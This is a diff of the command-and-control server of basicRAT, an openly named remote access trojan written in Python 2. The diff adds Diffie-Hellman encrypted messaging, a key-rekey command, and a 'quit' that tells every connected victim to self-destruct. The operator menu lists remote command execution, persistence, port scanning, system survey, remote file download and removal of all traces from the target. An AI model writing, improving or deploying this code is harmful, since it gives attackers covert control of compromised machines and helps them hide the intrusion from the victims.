@@ -1,5 +1,4 @@
 #!/usr/bin/env python
-# -*- coding: utf-8 -*-
 
 #
 # basicRAT server
@@ -11,9 +10,8 @@ import readline
 import socket
 import sys
 import threading
-import time
 
-from core import common, crypto
+from core.crypto import encrypt, decrypt, diffiehellman
 
 
 # ascii banner (Crawford2) - http://patorjk.com/software/taag/
@@ -28,29 +26,29 @@ BANNER = '''
 |_____||__|__| \___||____\____||__|\_||__|__|  |__|       '~  '~----''
          https://github.com/vesche/basicRAT
 '''
+COMMANDS = [ 'client', 'clients', 'execute', 'goodbye', 'help', 'kill',
+             'persistence', 'quit', 'rekey', 'scan', 'selfdestruct', 'survey',
+             'unzip', 'wget' ]
 HELP_TEXT = '''
 client <id>         - Connect to a client.
 clients             - List connected clients.
-download <file>     - Download a file.
 execute <command>   - Execute a command on the target.
+goodbye             - Exit the server and keep all client connections alive.
 help                - Show this help menu.
 kill                - Kill the client connection.
 persistence         - Apply persistence mechanism.
-quit                - Exit the server and end all client connections.
+quit                - Exit the server and destroy all client connections.
+rekey               - Regenerate crypto key.
 scan <ip>           - Scan top 25 TCP ports on a single host.
 selfdestruct        - Remove all traces of the RAT from the target system.
 survey              - Run a system survey.
 unzip <file>        - Unzip a file.
-upload <file>       - Upload a file.
 wget <url>          - Download a file from the web.'''
-COMMANDS = [ 'client', 'clients', 'download', 'execute', 'help', 'kill',
-             'persistence', 'quit', 'scan', 'selfdestruct', 'survey',
-             'unzip', 'upload', 'wget' ]
+PROMPT = '\n[{}] basicRAT> '
 
 
 class Server(threading.Thread):
     clients      = {}
-    alive        = True
     client_count = 1
 
     def __init__(self, port):
@@ -63,8 +61,9 @@ class Server(threading.Thread):
     def run(self):
         while True:
             conn, addr = self.s.accept()
+            dhkey = diffiehellman(conn)
             client_id = self.client_count
-            client = ClientConnection(conn, addr, uid=client_id)
+            client = ClientConnection(conn, addr, dhkey, uid=client_id)
             self.clients[client_id] = client
             self.client_count += 1
 
@@ -74,15 +73,33 @@ class Server(threading.Thread):
         except (KeyError, ValueError):
             return None
 
-    # order is not retained. maybe use SortedDict here
     def get_clients(self):
-        return [v for k,v in self.clients.iteritems() if v.alive]
+        # order is not retained. maybe use SortedDict here
+        return [v for _, v in self.clients.iteritems() if v.alive]
 
     def remove_client(self, key):
         return self.clients.pop(key, None)
 
+    def quit(self):
+        for c in self.get_clients():
+            c.send('selfdestruct')
+        self.s.shutdown(socket.SHUT_RDWR)
+        self.s.close()
 
-class ClientConnection(common.Client):
+    def goodbye(self):
+        for c in self.get_clients():
+            c.send('goodbye')
+        self.s.shutdown(socket.SHUT_RDWR)
+        self.s.close()
+
+
+class ClientConnection():
+    def __init__(self, conn, addr, dhkey, uid=0):
+        self.conn  = conn
+        self.addr  = addr
+        self.dhkey = dhkey
+        self.uid   = uid
+
     alive = True
 
     def send(self, prompt):
@@ -98,34 +115,30 @@ class ClientConnection(common.Client):
             if raw_input('Remove all traces of basicRAT from the target ' \
                          'system (y/N)? ').startswith('y'):
                 print 'Running selfdestruct...'
-                self.sendGCM(prompt)
+                self.conn.send(encrypt(prompt, self.dhkey))
                 self.conn.close()
             return
 
         # send prompt to client
-        self.sendGCM(prompt)
+        try:
+            self.conn.send(encrypt(prompt, self.dhkey))
+        except socket.error:
+            print 'Error: Could not connect to client.'
+            return
         self.conn.settimeout(1)
 
         # kill client connection
         if cmd == 'kill':
             self.conn.close()
 
-        # download a file
-        elif cmd == 'download':
-            self.recvfile(action.rstrip())
-
-        # send file
-        elif cmd == 'upload':
-            self.sendfile(action.rstrip())
-
-        # regenerate DH key
-        # elif cmd == 'rekey':
-        #     self.dh_key = crypto.diffiehellman(self.conn)
+        if cmd == 'rekey':
+            self.dhkey = diffiehellman(self.conn)
 
         # results of execute, persistence, scan, survey, unzip, or wget
-        elif cmd in ['execute', 'persistence', 'scan', 'survey', 'unzip', 'wget']:
+        if cmd in [ 'execute', 'persistence', 'rekey', 'scan', 'survey',
+                    'unzip', 'wget' ]:
             print 'Running {}...'.format(cmd)
-            recv_data = self.recvGCM().rstrip()
+            recv_data = decrypt(self.conn.recv(4096), self.dhkey)
             print recv_data
 
 
@@ -137,15 +150,12 @@ def get_parser():
 
 
 def main():
-    parser  = get_parser()
-    args    = vars(parser.parse_args())
-    port    = args['port']
-    client  = None
+    parser = get_parser()
+    args   = vars(parser.parse_args())
+    port   = args['port']
+    client = None
 
-    # print banner all sexy like
-    for line in BANNER.split('\n'):
-        time.sleep(0.05)
-        print line
+    print BANNER
 
     # start server
     server = Server(port)
@@ -155,9 +165,9 @@ def main():
 
     while True:
         try:
-            promptstr = '\n[{}] basicRAT> '.format(client.uid)
+            promptstr = PROMPT.format(client.uid)
         except AttributeError:
-            promptstr = '\n[{}] basicRAT> '.format('?')
+            promptstr = PROMPT.format('?')
 
         prompt = raw_input(promptstr).rstrip()
 
@@ -173,16 +183,23 @@ def main():
             print 'Invalid command, type "help" to see a list of commands.'
             continue
 
+        # stop the server and keey clients alive
+        elif cmd == 'goodbye':
+            if raw_input('Stop the server and keep clients alive ' \
+                         '(y/N)? ').startswith('y'):
+                server.goodbye()
+                sys.exit(0)
+
+        # stop the server and destroy clients
+        elif cmd == 'quit':
+            if raw_input('Stop the server and selfdestruct all client ' \
+                         'connections (y/N)? ').startswith('y'):
+                server.quit()
+                sys.exit(0)
+
         # display help text
         if cmd == 'help':
             print HELP_TEXT
-
-        # stop the server
-        elif cmd == 'quit':
-            if raw_input('Exit the server and end all client connections ' \
-                         '(y/N)? ').startswith('y'):
-                # gracefull kill all clients here
-                sys.exit(0)
 
         # select client
         elif cmd == 'client':
@@ -200,7 +217,7 @@ def main():
                 print '{:>2} - {}'.format(k.uid, k.addr[0])
 
         # continue loop for above commands
-        if cmd in ['client', 'clients', 'help', 'quit']:
+        if cmd in ['help', 'client', 'clients']:
             continue
 
         # require client id
@@ -213,8 +230,7 @@ def main():
             client.send(prompt)
         except (socket.error, ValueError) as e:
             print e
-            print 'Client {} disconnected.'.format(client.uid)
-            cmd = 'kill'
+            print 'Client {} is unresponsive.'.format(client.uid)
 
         # reset client id if client killed
         if cmd in ['kill', 'selfdestruct']:
